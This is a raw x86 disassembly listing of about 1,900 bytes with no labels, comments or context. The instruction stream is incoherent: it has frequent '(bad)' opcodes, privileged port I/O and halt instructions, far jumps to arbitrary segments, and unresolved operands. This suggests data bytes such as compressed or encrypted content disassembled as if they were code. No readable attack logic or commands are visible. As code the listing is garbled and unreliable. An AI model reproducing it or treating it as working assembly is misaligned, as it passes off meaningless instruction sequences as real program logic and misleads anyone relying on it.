  41c183:	popf   
  41c184:	(bad)  
  41c185:	pop    esp
  41c186:	mov    ecx,DWORD PTR [ecx]
  41c188:	push   0xffffffa2
  41c18a:	das    
  41c18b:	(bad)  
  41c18c:	jns    0x41c172
  41c18e:	mov    ecx,0xfac0e5b5
  41c193:	mov    BYTE PTR ds:0x4fd3944b,bh
  41c199:	fmul   st,st(0)
  41c19b:	imul   DWORD PTR [ecx+esi*1-0x55]
  41c19f:	adc    DWORD PTR [ebp+0x5e],eax
  41c1a2:	(bad)  
  41c1a3:	push   ebp
  41c1a4:	push   ss
  41c1a5:	ss popa 
  41c1a7:	fcomp  QWORD PTR ds:0x305abf04
  41c1ad:	aaa    
  41c1ae:	mov    cl,0x98
  41c1b0:	push   ecx
  41c1b1:	cmovs  edi,DWORD PTR [edx]
  41c1b4:	fmul   QWORD PTR [ecx]
  41c1b6:	jnp    0x41c161
  41c1b8:	xor    eax,0x934bf0a9
  41c1bd:	(bad)  
  41c1bf:	arpl   WORD PTR [ebp+0xd],di
  41c1c2:	and    DWORD PTR [edx],esp
  41c1c4:	xlat   BYTE PTR ds:[ebx]
  41c1c5:	and    edx,edi
  41c1c7:	pop    ss
  41c1c8:	mov    eax,ds:0xd448b888
  41c1cd:	fistp  DWORD PTR [edi+eiz*4]
  41c1d0:	mov    al,bh
  41c1d2:	add    eax,0x2bdf6931
  41c1d7:	sub    eax,0x68c59476
  41c1dc:	sti    
  41c1dd:	xchg   edx,eax
  41c1de:	cmp    al,0x84
  41c1e0:	hlt    
  41c1e1:	xchg   ecx,eax
  41c1e2:	mov    edi,0x8010f868
  41c1e7:	mov    ch,0x1f
  41c1e9:	out    0x9e,eax
  41c1eb:	jmp    0x7b0387f1
  41c1f0:	sbb    edx,DWORD PTR [eax]
  41c1f2:	aas    
  41c1f3:	push   es
  41c1f4:	push   ss
  41c1f5:	sbb    al,0x2a
  41c1f7:	add    DWORD PTR [ebp+eax*2-0x5c],0x38
  41c1fc:	mov    cl,al
  41c1fe:	sbb    ecx,ebp
  41c200:	sbb    BYTE PTR [ebp+0x2d],0x66
  41c204:	lods   eax,DWORD PTR ds:[esi]
  41c205:	fs mov bh,0xf6
  41c208:	lock jno 0x41c214
  41c20b:	pop    ebp
  41c20c:	sar    BYTE PTR [eax+0x7ab68886],1
  41c212:	sub    al,0xe5
  41c214:	jmp    0x41c1ce
  41c216:	add    BYTE PTR ss:[edi+0xf],ah
  41c21a:	inc    ebp
  41c21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21c:	sbb    BYTE PTR [eax+0x6f],bh
  41c21f:	call   0xc09ac560
  41c224:	cmp    eax,0x32f7664f
  41c229:	adc    DWORD PTR [edi+ebx*2],esi
  41c22c:	pop    edi
  41c22d:	mov    esp,0xb28d72d1
  41c232:	aam    0xb9
  41c234:	dec    ebp
  41c235:	add    ch,BYTE PTR [edx-0x2717c957]
  41c23b:	repz xchg edi,eax
  41c23d:	or     al,0xe9
  41c23f:	add    bh,BYTE PTR [ecx]
  41c241:	sub    edx,0x5
  41c244:	mov    ebx,0x26380237
  41c249:	dec    edi
  41c24a:	loope  0x41c214
  41c24c:	je     0x41c221
  41c24e:	jo     0x41c27b
  41c250:	rcr    eax,0xf0
  41c253:	or     BYTE PTR [eax+ebp*4-0x4d9c5e38],0x5e
  41c25b:	leave  
  41c25c:	pop    edi
  41c25d:	or     bh,BYTE PTR [bp-0x37]
  41c261:	fimul  DWORD PTR [eax-0x39]
  41c264:	dec    esi
  41c265:	rol    DWORD PTR [edi+edx*2],cl
  41c268:	and    edx,DWORD PTR [ebp-0x4670cf93]
  41c26e:	dec    ecx
  41c26f:	out    0x60,al
  41c271:	int    0x8
  41c273:	mov    al,ds:0xcf369ac
  41c278:	test   al,0x70
  41c27a:	adc    eax,0xee66df06
  41c27f:	jbe    0x41c242
  41c281:	xchg   esi,eax
  41c282:	inc    esi
  41c283:	xchg   edx,eax
  41c284:	push   ebp
  41c285:	daa    
  41c286:	cmp    DWORD PTR [eax-0x17df23fb],ecx
  41c28c:	jg     0x41c2ab
  41c28e:	pop    ebp
  41c28f:	mov    WORD PTR [edi-0x78],ds
  41c292:	popf   
  41c293:	add    al,0xcc
  41c295:	pop    ebx
  41c296:	mov    eax,0xb3aa82
  41c29b:	mov    ss,edx
  41c29d:	fistp  DWORD PTR [ebx+0x75]
  41c2a0:	or     bh,bl
  41c2a2:	add    DWORD PTR [ebx],ebx
  41c2a4:	jl     0x41c31d
  41c2a6:	test   BYTE PTR [esp+ebx*1+0x6755800d],dl
  41c2ad:	xchg   BYTE PTR [eax],ch
  41c2af:	in     eax,dx
  41c2b0:	stos   DWORD PTR es:[edi],eax
  41c2b1:	rcr    DWORD PTR [ebx+0x5326a9ab],0x9
  41c2b8:	xchg   BYTE PTR [edx+0x7c],al
  41c2bb:	inc    ebx
  41c2bc:	inc    ebp
  41c2bd:	pop    ss
  41c2be:	hlt    
  41c2bf:	cmp    al,0xa8
  41c2c1:	outs   dx,DWORD PTR ds:[esi]
  41c2c2:	xchg   esp,eax
  41c2c3:	icebp  
  41c2c4:	dec    edx
  41c2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2c6:	js     0x41c28f
  41c2c8:	(bad)  
  41c2c9:	jg     0x41c29f
  41c2cb:	or     esp,DWORD PTR [ebp-0x380f9fd4]
  41c2d1:	xchg   ecx,eax
  41c2d2:	mov    ecx,0x21ccb8d3
  41c2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d8:	jne    0x41c33b
  41c2da:	push   esi
  41c2db:	in     eax,0x12
  41c2dd:	adc    eax,0x31701fb6
  41c2e2:	in     al,dx
  41c2e3:	sub    ebx,DWORD PTR [esi+0x38]
  41c2e6:	jae    0x41c2af
  41c2e8:	in     al,dx
  41c2e9:	out    dx,eax
  41c2ea:	xchg   esi,eax
  41c2eb:	in     eax,0xad
  41c2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ee:	retf   0x58e9
  41c2f1:	lds    edi,FWORD PTR [esp+eax*2]
  41c2f4:	push   ecx
  41c2f5:	cld    
  41c2f6:	aam    0x79
  41c2f8:	outs   dx,BYTE PTR ds:[esi]
  41c2f9:	sti    
  41c2fa:	push   esi
  41c2fb:	sbb    edx,DWORD PTR [edx-0x696a4926]
  41c301:	and    esp,edi
  41c303:	das    
  41c304:	or     cl,BYTE PTR gs:[eax-0x29a7e1ee]
  41c30b:	into   
  41c30c:	xor    BYTE PTR [ebx-0x78],ah
  41c30f:	dec    eax
  41c310:	popa   
  41c311:	jnp    0x41c38b
  41c313:	dec    ecx
  41c314:	inc    ebp
  41c315:	jmp    0x2ff9:0x76359657
  41c31c:	or     eax,0xae74e56c
  41c321:	les    esp,FWORD PTR [esi-0x7d]
  41c324:	push   ss
  41c325:	imul   edx,DWORD PTR [eax+0x3a13e1a],0x4c
  41c32c:	sti    
  41c32d:	add    BYTE PTR ds:0x7363903d,dh
  41c333:	sbb    eax,DWORD PTR [ebx-0x333e66d3]
  41c339:	scas   al,BYTE PTR es:[edi]
  41c33a:	popa   
  41c33b:	ds (bad) 
  41c33d:	push   ss
  41c33e:	test   al,0x35
  41c340:	loope  0x41c3b1
  41c342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c343:	fidiv  DWORD PTR [ebx-0x62]
  41c346:	mov    ah,0x6
  41c348:	dec    ebx
  41c349:	mov    bh,0xe1
  41c34b:	sub    edx,edx
  41c34d:	sub    al,0x58
  41c34f:	test   eax,0x24c41dce
  41c354:	sub    dh,BYTE PTR [eax-0x6247b9f2]
  41c35a:	cli    
  41c35b:	sahf   
  41c35c:	cmp    BYTE PTR [esi],0x70
  41c35f:	xor    ebx,DWORD PTR [ebx+ebp*8]
  41c362:	ret    0xc42b
  41c365:	not    ah
  41c367:	jp     0x41c373
  41c369:	xor    esi,esp
  41c36b:	or     BYTE PTR [ebp-0x23d34e20],0x8e
  41c372:	cmp    BYTE PTR [eax-0x2af368f8],al
  41c378:	jmp    0x4c1c:0x5359b458
  41c37f:	in     al,dx
  41c380:	repnz (bad) 
  41c382:	mov    ah,0x13
  41c384:	inc    ebx
  41c385:	push   ebp
  41c386:	pusha  
  41c387:	push   edi
  41c388:	inc    ebp
  41c389:	pop    ebp
  41c38a:	cwde   
  41c38b:	pushf  
  41c38c:	add    eax,0x3b90ccb0
  41c391:	cmc    
  41c392:	ja     0x41c32a
  41c394:	add    bl,BYTE PTR [esi]
  41c396:	repz ret 0xb56f
  41c39a:	jg     0x41c3bd
  41c39c:	add    BYTE PTR [ebp-0x44c40ec3],dh
  41c3a2:	sbb    edx,edx
  41c3a4:	(bad)  
  41c3a5:	add    eax,0xdaf564e6
  41c3aa:	lock fwait
  41c3ac:	cdq    
  41c3ad:	in     eax,dx
  41c3ae:	mov    ebp,0x6a39ae50
  41c3b3:	call   0xf8cbad72
  41c3b8:	repz in eax,0x91
  41c3bb:	jmp    0x41c3cf
  41c3bd:	or     al,0xc
  41c3bf:	(bad)  
  41c3c0:	pop    edx
  41c3c1:	pop    ds
  41c3c2:	out    0xd7,eax
  41c3c4:	lock xchg ebp,eax
  41c3c6:	inc    ebx
  41c3c7:	daa    
  41c3c8:	(bad)  
  41c3c9:	add    esp,DWORD PTR [edx+ebx*8-0x706a002d]
  41c3d0:	sar    dl,cl
  41c3d2:	mov    edx,ss
  41c3d4:	ret    0xd70b
  41c3d7:	enter  0x75c0,0xe1
  41c3db:	mov    esp,0x3ee1473e
  41c3e0:	or     eax,0x35c8477e
  41c3e5:	push   ebx
  41c3e6:	xlat   BYTE PTR ds:[ebx]
  41c3e7:	pop    eax
  41c3e8:	push   cs
  41c3e9:	sti    
  41c3ea:	xchg   ecx,eax
  41c3eb:	ja     0x41c429
  41c3ed:	pop    esi
  41c3ee:	xchg   edi,eax
  41c3ef:	xor    ecx,edi
  41c3f1:	jmp    0xb0c:0x7d983e8b
  41c3f8:	mov    bh,BYTE PTR [esi+ebp*2-0x36]
  41c3fc:	sub    DWORD PTR [edx-0x66680f79],ecx
  41c402:	xchg   esi,eax
  41c403:	mov    al,al
  41c405:	jno    0x41c3a5
  41c407:	add    cl,BYTE PTR [ebp+0x6d7e363c]
  41c40d:	cmc    
  41c40e:	mov    ch,0x29
  41c411:	ins    BYTE PTR es:[edi],dx
  41c412:	push   cs
  41c413:	out    0x63,al
  41c415:	cdq    
  41c416:	aad    0x38
  41c418:	pop    ds
  41c419:	push   ebp
  41c41a:	pop    edi
  41c41b:	sar    BYTE PTR [edi+0x2b],0x59
  41c41f:	jg     0x41c3e4
  41c421:	aad    0x33
  41c423:	aaa    
  41c424:	mov    ds:0x15716176,al
  41c429:	popa   
  41c42a:	mov    ch,0x5a
  41c42c:	mov    cl,0x49
  41c42e:	or     ebx,DWORD PTR [esi-0x74]
  41c431:	inc    edi
  41c432:	sbb    eax,0x1d722e99
  41c437:	mov    ?,WORD PTR [eax]
  41c439:	fbstp  TBYTE PTR [eax-0x3f]
  41c43c:	(bad)  
  41c43d:	xchg   ebp,eax
  41c43e:	add    BYTE PTR [ebp-0x74b40bbd],dh
  41c444:	add    al,0xe4
  41c446:	xor    DWORD PTR [esi],ebx
  41c448:	rol    DWORD PTR [edi+0xdcc0329],0x36
  41c44f:	dec    esp
  41c450:	dec    edi
  41c451:	iret   
  41c452:	add    esi,edi
  41c454:	mov    esp,0xcaa4a5e1
  41c459:	hlt    
  41c45a:	ins    BYTE PTR es:[edi],dx
  41c45b:	sub    al,0x2a
  41c45d:	(bad)  
  41c45e:	sub    ch,BYTE PTR [esi]
  41c460:	(bad)  
  41c462:	aaa    
  41c463:	enter  0x1b52,0xa4
  41c467:	xchg   edi,eax
  41c468:	cmc    
  41c469:	repz xchg esi,eax
  41c46b:	ret    0x63bc
  41c46e:	aaa    
  41c46f:	fmul   QWORD PTR [ecx-0x4d53a424]
  41c475:	dec    esi
  41c476:	stc    
  41c477:	cmp    DWORD PTR [esi-0x40a4d602],edx
  41c47d:	lods   eax,DWORD PTR ds:[esi]
  41c47e:	dec    ebp
  41c47f:	(bad)  
  41c480:	arpl   ax,di
  41c482:	push   eax
  41c483:	das    
  41c484:	stos   BYTE PTR es:[di],al
  41c486:	xchg   ebp,eax
  41c487:	xor    esi,0x2e
  41c48a:	imul   eax,esi,0x84389726
  41c490:	cmp    BYTE PTR [esi+0x71ecf051],al
  41c496:	loop   0x41c4f3
  41c498:	and    eax,esi
  41c49a:	and    eax,0x3f256422
  41c49f:	and    al,0xf9
  41c4a1:	push   0x5724ab44
  41c4a6:	sbb    DWORD PTR [eax-0x2dc2d389],edx
  41c4ac:	fiadd  WORD PTR [ecx+edi*1+0x2e]
  41c4b0:	cmp    esi,eax
  41c4b2:	sub    edi,edx
  41c4b4:	xchg   esi,eax
  41c4b5:	sbb    cl,ah
  41c4b7:	xchg   ebx,eax
  41c4b8:	sahf   
  41c4b9:	sub    eax,0x262f2a6
  41c4be:	shl    BYTE PTR [ebx+0xc64eb92],cl
  41c4c4:	sub    bh,bl
  41c4c6:	(bad)  
  41c4c7:	icebp  
  41c4c8:	jge    0x41c4e3
  41c4ca:	jno    0x41c490
  41c4cc:	fdiv   DWORD PTR [eiz*4-0x1a40e819]
  41c4d3:	mov    bh,0x2c
  41c4d5:	popf   
  41c4d6:	xor    al,0x46
  41c4d8:	push   DWORD PTR [edi]
  41c4da:	dec    ebp
  41c4db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4dc:	dec    edx
  41c4dd:	shl    DWORD PTR [ebp+0x26],cl
  41c4e0:	(bad)  
  41c4e1:	mov    bl,0x2b
  41c4e3:	push   edx
  41c4e4:	cmp    BYTE PTR [esi-0x3fa1537],cl
  41c4ea:	mov    ebp,0xfc02a71d
  41c4ef:	mov    ds:0x4e8d3119,eax
  41c4f4:	leave  
  41c4f5:	scas   eax,DWORD PTR es:[edi]
  41c4f6:	mov    dl,0x6e
  41c4f8:	and    ebp,esi
  41c4fa:	scas   eax,DWORD PTR es:[edi]
  41c4fb:	std    
  41c4fc:	nop    DWORD PTR [eax-0x65846b55]
  41c503:	ret    
  41c504:	adc    esp,0x9b89e60b
  41c50a:	call   0xeef04f35
  41c50f:	or     al,cl
  41c511:	xor    al,BYTE PTR [eax-0xbd9bbc8]
  41c517:	adc    ch,BYTE PTR [esi]
  41c519:	jg     0x41c4de
  41c51b:	mov    bl,0xba
  41c51d:	sub    al,0x32
  41c51f:	cmp    BYTE PTR [edi-0x7f275042],dl
  41c525:	mov    BYTE PTR [eax+0x14a65345],0x84
  41c52c:	push   ebx
  41c52d:	xor    BYTE PTR [ecx-0x3a642bfc],dh
  41c533:	and    al,0x8f
  41c535:	outs   dx,DWORD PTR ds:[esi]
  41c536:	jmp    0xa073:0x7ebe3e8d
  41c53d:	push   eax
  41c53e:	mov    esp,0x955b994d
  41c543:	push   ebp
  41c544:	ins    BYTE PTR es:[edi],dx
  41c545:	daa    
  41c546:	jp     0x41c4c9
  41c548:	test   BYTE PTR [ebp+0x6c249c49],bl
  41c54e:	int    0x21
  41c550:	imul   eax,DWORD PTR ss:[eax-0x16],0xffffffac
  41c555:	out    0x5f,al
  41c557:	aas    
  41c558:	and    DWORD PTR [edi-0x3dff4d47],esi
  41c55e:	sub    DWORD PTR ds:0xd15b8e01,ebx
  41c564:	into   
  41c565:	jns    0x41c5e0
  41c567:	and    ecx,esp
  41c569:	push   esi
  41c56a:	or     WORD PTR [edi],di
  41c56d:	and    esi,DWORD PTR [edx]
  41c56f:	pusha  
  41c570:	aaa    
  41c571:	leave  
  41c572:	div    edi
  41c574:	jbe    0x41c528
  41c576:	push   es
  41c577:	inc    DWORD PTR [ebx+0x70ca816f]
  41c57d:	mov    DWORD PTR [ecx-0x39],esi
  41c580:	sub    al,0x3b
  41c582:	inc    ecx
  41c583:	sub    bh,BYTE PTR [ecx-0x32]
  41c586:	ret    0xc163
  41c589:	(bad)  
  41c58a:	in     al,0xae
  41c58c:	stos   DWORD PTR es:[edi],eax
  41c58d:	(bad)  
  41c58e:	jne    0x41c55a
  41c590:	rcr    ecx,0xdf
  41c593:	inc    ecx
  41c594:	das    
  41c595:	stos   BYTE PTR es:[edi],al
  41c596:	pop    eax
  41c597:	push   ebx
  41c598:	fnstenv [ebx-0x28]
  41c59b:	stc    
  41c59c:	pop    ebp
  41c59d:	push   ecx
  41c59e:	outs   dx,BYTE PTR ds:[esi]
  41c59f:	je     0x41c581
  41c5a1:	jnp    0x41c567
  41c5a3:	(bad)  
  41c5a4:	push   ebp
  41c5a5:	mov    WORD PTR [eax+0x15],gs
  41c5a8:	ret    0xd9df
  41c5ab:	add    BYTE PTR [ebp+0x1e],cl
  41c5ae:	push   ecx
  41c5af:	scas   eax,DWORD PTR es:[edi]
  41c5b0:	hlt    
  41c5b1:	or     DWORD PTR [ebx-0x4b],esp
  41c5b4:	push   esp
  41c5b5:	and    al,0x52
  41c5b7:	mov    DWORD PTR [esi-0x7749fc18],edx
  41c5bd:	mov    bl,0x78
  41c5bf:	jmp    0x4ff4aef7
  41c5c4:	jecxz  0x41c5d8
  41c5c6:	test   BYTE PTR [ecx],ah
  41c5c8:	lahf   
  41c5c9:	aam    0xe3
  41c5cb:	jns    0x41c603
  41c5cd:	push   0x28
  41c5cf:	mov    eax,0x41f61d46
  41c5d4:	push   0xc791e672
  41c5d9:	mov    esp,0xc1dee781
  41c5de:	xor    BYTE PTR [edi+0x73ba050c],bl
  41c5e4:	and    BYTE PTR [ebp+0x3],al
  41c5e7:	mov    esp,0xdda29da9
  41c5ec:	inc    eax
  41c5ed:	mov    dh,BYTE PTR ds:0x1d89ce99
  41c5f3:	mov    ds,WORD PTR [eax+0x67]
  41c5f6:	cmc    
  41c5f7:	mov    ebp,0xd20dde1b
  41c5fc:	je     0x41c5e8
  41c5fe:	pop    ecx
  41c5ff:	or     eax,0xf182f207
  41c604:	xchg   edx,eax
  41c605:	xor    BYTE PTR [ebx+0x657d53],bh
  41c60b:	je     0x41c67c
  41c60d:	(bad)  [esp+ebp*8-0xa7c1047]
  41c614:	xchg   ebp,eax
  41c615:	jle    0x41c645
  41c617:	in     al,0x5d
  41c619:	retf   
  41c61a:	fdiv   DWORD PTR [edi+0x640575c0]
  41c620:	in     eax,0xd9
  41c622:	loop   0x41c67b
  41c624:	aas    
  41c625:	and    dl,ah
  41c627:	ins    BYTE PTR es:[edi],dx
  41c628:	test   eax,0xd4b7c9df
  41c62d:	pop    es
  41c62e:	add    al,BYTE PTR [edx+esi*1+0x635557e6]
  41c635:	mov    ecx,0xce99c010
  41c63a:	mov    bl,0xd9
  41c63c:	jo     0x41c62b
  41c63e:	(bad)  
  41c63f:	xchg   esi,eax
  41c640:	les    edx,FWORD PTR [eax+0x10]
  41c643:	xchg   ebp,eax
  41c644:	inc    edx
  41c645:	jne    0x41c67f
  41c647:	pop    edx
  41c648:	stc    
  41c649:	pop    edx
  41c64a:	stos   DWORD PTR es:[edi],eax
  41c64b:	xor    DWORD PTR [edi],edi
  41c64d:	and    ch,BYTE PTR [ebp+edi*2-0x37]
  41c651:	out    dx,eax
  41c652:	mul    cl
  41c654:	or     WORD PTR [ebp-0x4c],di
  41c658:	adc    BYTE PTR [esi+0x94dee80],0x4d
  41c65f:	icebp  
  41c660:	lea    esi,ds:0xd37ad519
  41c666:	push   cs
  41c667:	add    dl,0x14
  41c66a:	loope  0x41c6c7
  41c66c:	aas    
  41c66d:	fdivrp st(7),st
  41c66f:	mov    edi,0x32e1324f
  41c674:	inc    eax
  41c675:	call   0xb3570327
  41c67a:	in     eax,dx
  41c67b:	inc    eax
  41c67c:	and    bl,ch
  41c67e:	std    
  41c67f:	jge    0x41c619
  41c681:	xchg   esp,eax
  41c682:	sbb    edx,0xffffffe0
  41c685:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c687:	outs   dx,BYTE PTR ds:[esi]
  41c688:	or     BYTE PTR [edi-0x5d],0x7a
  41c68c:	sub    eax,0x85ac20a1
  41c691:	mov    ebp,0x39b137cc
  41c696:	(bad)  [eax]
  41c698:	xor    bl,BYTE PTR [edx-0x6656f991]
  41c69e:	xchg   DWORD PTR [ecx+0x43],eax
  41c6a1:	lods   eax,DWORD PTR ds:[esi]
  41c6a2:	bound  edx,QWORD PTR [ebp-0x4aaee80f]
  41c6a8:	sbb    DWORD PTR [edx+0x3d2bae11],ecx
  41c6ae:	push   0xc2c551dd
  41c6b3:	lods   eax,DWORD PTR ds:[esi]
  41c6b4:	and    al,0xa
  41c6b6:	mov    edi,0x620faa41
  41c6bb:	inc    edi
  41c6bc:	sbb    ch,BYTE PTR [esi]
  41c6be:	lods   al,BYTE PTR ds:[esi]
  41c6bf:	fwait
  41c6c0:	mov    ebp,0x1268adc6
  41c6c5:	cwde   
  41c6c6:	cdq    
  41c6c7:	cmc    
  41c6c8:	sbb    al,0x4e
  41c6ca:	or     ch,BYTE PTR [esi]
  41c6cc:	mov    edi,0xba3d8191
  41c6d1:	cwde   
  41c6d2:	sahf   
  41c6d3:	add    BYTE PTR [ebx],0x55
  41c6d6:	aaa    
  41c6d7:	ror    DWORD PTR ds:0x9c36aa65,1
  41c6dd:	dec    esp
  41c6de:	sbb    cl,cl
  41c6e0:	test   eax,0x94b244a6
  41c6e5:	hlt    
  41c6e6:	je     0x41c70a
  41c6e8:	jno    0x41c692
  41c6ea:	inc    esp
  41c6eb:	sbb    dl,BYTE PTR [esp+eax*4-0x23]
  41c6ef:	dec    ecx
  41c6f0:	xchg   ecx,eax
  41c6f1:	not    BYTE PTR [eax-0x422aed61]
  41c6f7:	dec    edx
  41c6f8:	sbb    BYTE PTR [edx-0x98d0b60],0xd4
  41c6ff:	dec    esp
  41c700:	sbb    al,0xa7
  41c702:	imul   ebp,DWORD PTR ss:[ecx],0x99d6ef10
  41c709:	push   0x57
  41c70b:	ja     0x41c71d
  41c70d:	push   eax
  41c70e:	push   0xd787e730
  41c713:	and    edx,edi
  41c715:	mov    ecx,DWORD PTR [ecx+edx*8-0x56]
  41c719:	loope  0x41c69d
  41c71b:	mov    edi,0x87ac100f
  41c720:	mov    ds:0x9b59157f,al
  41c725:	fdiv   st,st(3)
  41c727:	cmp    eax,esi
  41c729:	jb     0x41c6f9
  41c72b:	sub    al,0x2c
  41c72d:	adc    ebx,ebx
  41c72f:	cmp    dh,ah
  41c731:	out    0x9f,eax
  41c733:	lods   eax,DWORD PTR ds:[esi]
  41c734:	out    0x68,eax
  41c736:	stos   BYTE PTR es:[edi],al
  41c737:	loope  0x41c727
  41c739:	lods   al,BYTE PTR ds:[esi]
  41c73a:	jb     0x41c749
  41c73c:	daa    
  41c73d:	mov    eax,0x3eadcd82
  41c742:	xor    al,0xb6
  41c744:	ins    DWORD PTR es:[edi],dx
  41c745:	push   ecx
  41c746:	test   BYTE PTR [ebx-0x74593645],al
  41c74c:	mov    ah,BYTE PTR [edi+0x2a5d71d3]
  41c752:	jge    0x41c76f
  41c754:	dec    edx
  41c755:	jno    0x41c771
  41c757:	mov    ds:0x741b03d4,al
  41c75c:	push   eax
  41c75d:	sub    BYTE PTR [edx+0x29],ah
  41c760:	or     ebx,DWORD PTR [esi-0x183a5a41]
  41c766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c767:	imul   edi,DWORD PTR [esi-0x269bc195],0x545aab57
  41c771:	and    ecx,DWORD PTR [esi-0x9]
  41c774:	popa   
  41c775:	sbb    edi,DWORD PTR [ecx+0x52]
  41c778:	sbb    edx,DWORD PTR [ebx-0x2f]
  41c77b:	mov    ds:0x61a47996,eax
  41c780:	enter  0x3bfd,0xbc
  41c784:	(bad)  
  41c785:	fsub   st(3),st
  41c787:	pop    esi
  41c788:	mov    esi,0xcdf781f1
  41c78d:	shl    BYTE PTR [eax-0x68f93bc3],cl
  41c793:	sahf   
  41c794:	cmp    al,0xf3
  41c796:	add    eax,0x49e5f57a
  41c79b:	loop   0x41c746
  41c79d:	loope  0x41c724
  41c79f:	adc    cl,0x87
  41c7a2:	push   edi
  41c7a3:	pushf  
  41c7a4:	mov    WORD PTR [edx+0x72],?
  41c7a7:	jge    0x41c76e
  41c7a9:	arpl   WORD PTR [esi],ax
  41c7ab:	ss pop edx
  41c7ad:	(bad)  
  41c7ae:	out    0xf5,eax
  41c7b0:	enter  0x656f,0x40
  41c7b4:	inc    edx
  41c7b5:	inc    esp
  41c7b6:	int3   
  41c7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7b8:	mov    bh,0xbe
  41c7ba:	loope  0x41c7f0
  41c7bc:	add    BYTE PTR [edi-0x1acfa7aa],cl
  41c7c2:	mov    edi,0x5b02979
  41c7c7:	jle    0x41c7c5
  41c7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ca:	xor    DWORD PTR [esi+0x5e],edx
  41c7cd:	xchg   esi,eax
  41c7ce:	pop    ds
  41c7cf:	(bad)  [esi]
  41c7d1:	iret   
  41c7d2:	mov    dh,0xf9
  41c7d4:	xchg   edx,eax
  41c7d5:	cdq    
  41c7d6:	jmp    0x41c7aa
  41c7d8:	jo     0x41c804
  41c7da:	adc    eax,0x6f3d72c1
  41c7df:	mov    al,0x57
  41c7e1:	inc    esi
  41c7e2:	inc    eax
  41c7e3:	mov    al,ds:0x72a55791
  41c7e8:	adc    BYTE PTR [ecx],dh
  41c7ea:	mov    ch,cl
  41c7ec:	and    al,0x56
  41c7ee:	or     BYTE PTR [ebx+eiz*8],0xb3
  41c7f2:	push   es
  41c7f3:	sbb    al,0x26
  41c7f5:	and    al,0xa9
  41c7f7:	fs loope 0x41c80b
  41c7fa:	xchg   esp,eax
  41c7fb:	imul   ecx,DWORD PTR [ebx],0x93308024
  41c801:	aaa    
  41c802:	mov    DWORD PTR [ebx],eax
  41c804:	xor    eax,0xe8cd801
  41c809:	lea    esi,[edi+0x62]
  41c80c:	push   0xffffffc0
  41c80e:	dec    ebp
  41c80f:	jmp    DWORD PTR [esi]
  41c811:	js     0x41c836
  41c813:	ss scas eax,DWORD PTR es:[edi]
  41c815:	add    eax,0x10734119
  41c81a:	sar    BYTE PTR [edi-0x66e4a154],cl
  41c820:	dec    ebp
  41c821:	xor    eax,0xc670b765
  41c826:	or     cl,bl
  41c828:	(bad)  
  41c82a:	retf   
  41c82b:	dec    ebp
  41c82c:	or     eax,0xe3a08a6e
  41c831:	outs   dx,BYTE PTR ds:[esi]
  41c832:	xchg   ebp,eax
  41c833:	mov    al,0xd
  41c835:	inc    ecx
  41c836:	outs   dx,DWORD PTR ds:[esi]
  41c837:	or     DWORD PTR [esi],ecx
  41c839:	add    eax,0xb60fc720
  41c83e:	jno    0x41c7c3
  41c840:	shr    DWORD PTR [esi],0xfa
  41c843:	push   ss
  41c844:	sbb    BYTE PTR [ecx-0x25],bl
  41c847:	mov    al,0x71
  41c849:	in     al,dx
  41c84a:	sub    eax,0xfe46b832
  41c84f:	inc    edx
  41c850:	add    BYTE PTR [edi],bh
  41c852:	jmp    0x65e3:0xb7e89be0
  41c859:	push   0x717ca985
  41c85e:	inc    edx
  41c85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c860:	jmp    DWORD PTR [eax+esi*4]
  41c863:	shl    BYTE PTR [ebx+0x71],0xd
  41c867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c868:	out    0xf7,eax
  41c86a:	adc    DWORD PTR [ebx-0x49da7a68],eax
  41c870:	mov    es:0x6e412d66,eax
  41c876:	push   0x4fb9a8dd
  41c87b:	or     al,0x5c
  41c87d:	mov    ah,0xb5
  41c87f:	add    BYTE PTR [esi],dh
  41c881:	sub    DWORD PTR [edx],esp
  41c883:	jle    0x41c84b
  41c885:	retf   
  41c886:	fcmovb st,st(1)
  41c888:	push   esp
  41c889:	retf   
  41c88a:	aad    0x7d
  41c88c:	sbb    DWORD PTR [eax+0x6619c6da],ebx
  41c892:	fisttp DWORD PTR [ebp-0x563c95b4]
  41c898:	sub    al,0x1b
  41c89a:	xchg   ecx,eax
  41c89b:	and    DWORD PTR [ebx],0xffffffb8
  41c89e:	retf   0x93c4
  41c8a1:	pop    ecx
  41c8a2:	les    eax,FWORD PTR [ebp-0x30]
  41c8a5:	pop    ss
  41c8a6:	xor    dl,BYTE PTR [esp+eax*2-0x7f6d84c]
  41c8ad:	dec    esi
  41c8ae:	push   edx
  41c8af:	aas    
  41c8b0:	fs jo  0x41c902
  41c8b3:	inc    esp
  41c8b4:	push   edi
  41c8b5:	int3   
  41c8b6:	pop    ebx
  41c8b7:	and    al,0x2a
  41c8b9:	cmp    cl,BYTE PTR ss:[edi+0x1ce31ef5]
  41c8c0:	lock and BYTE PTR [ebp+0x2f604c23],dl
  41c8c7:	adc    eax,0xa2923a0d
  41c8cc:	mov    DWORD PTR [ebx+ebp*4],ecx
  41c8cf:	inc    ecx
  41c8d0:	cli    
  41c8d1:	mov    ecx,0xd5fda6d9
  41c8d6:	sbb    BYTE PTR [eax+0x588e66a8],0x5b
  41c8dd:	cdq    
  41c8de:	mov    ebp,0x33e0cd44
  41c8e3:	sbb    ah,BYTE PTR [edx+0x19]
  41c8e6:	pop    ecx
  41c8e7:	jns    0x41c8e7
  41c8e9:	aaa    
  41c8ea:	cli    
  41c8eb:	repz sbb ebx,ebp
  41c8ee:	daa    
  41c8ef:	xchg   ebp,eax
  41c8f0:	cmp    dl,BYTE PTR [ecx-0x726474b9]
  41c8f6:	jb     0x41c8f4
  41c8f8:	mov    eax,0xf7b0c944
  41c8fd:	pop    esp
  41c8fe:	(bad)  
  41c8ff:	jl     0x41c917
  41c901:	and    bh,ah
  41c903:	in     al,dx
